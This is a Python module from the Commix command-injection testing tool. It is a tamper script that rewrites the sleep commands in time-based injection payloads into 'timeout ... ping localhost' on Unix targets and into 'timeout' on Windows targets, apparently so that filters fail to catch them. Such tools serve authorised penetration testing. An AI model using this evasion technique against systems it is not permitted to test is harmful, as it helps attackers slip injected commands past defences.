#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
from src.utils import menu
from src.utils import settings
from src.core.injections.controller import checks

"""
About: Uses "timeout" function for time-based attacks.
  * Regarding Unix-like target(s), it replaces the "sleep XX" command with "timeout XX ping localhost". 
  * Regarding windows target(s), it replaces the "powershell.exe -InputFormat none Start-Sleep -s XX" command with "timeout XX".
Notes: This tamper script works against all targets.
"""

__tamper__ = "sleep2timeout"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  def sleep_to_timeout_ping(payload):
    settings.TAMPER_SCRIPTS[__tamper__] = True
    if settings.TARGET_OS != "win":
      for match in re.finditer(r"sleep" + settings.WHITESPACES[0] + "([1-9]\d+|[0-9])", payload):
        payload = payload.replace(match.group(0), match.group(0).replace("sleep", "timeout") + " ping localhost".replace(settings.SINGLE_WHITESPACE,settings.WHITESPACES[0]))
        payload = payload.replace("timeout" + settings.WHITESPACES[0] + "0" + settings.WHITESPACES[0] + "ping" + settings.WHITESPACES[0] + "localhost", "timeout" + settings.WHITESPACES[0] + "0")
    else:
      payload = payload.replace("powershell.exe" + settings.WHITESPACES[0] + "-InputFormat" + settings.WHITESPACES[0] + "none" + settings.WHITESPACES[0] + "Start-Sleep" + settings.WHITESPACES[0] + "-s", "timeout")
    return payload

  if settings.CLASSIC_STATE != False or \
     settings.EVAL_BASED_STATE != False or \
     settings.FILE_BASED_STATE != False:
    if settings.TRANFROM_PAYLOAD == None:
      if settings.TRANFROM_PAYLOAD == None:
        checks.time_relative_tamper(__tamper__)
        settings.TRANFROM_PAYLOAD = False
      return payload
  else:
    settings.TRANFROM_PAYLOAD = True
    if settings.TRANFROM_PAYLOAD:
      return sleep_to_timeout_ping(payload)
      
  return payload

# eof 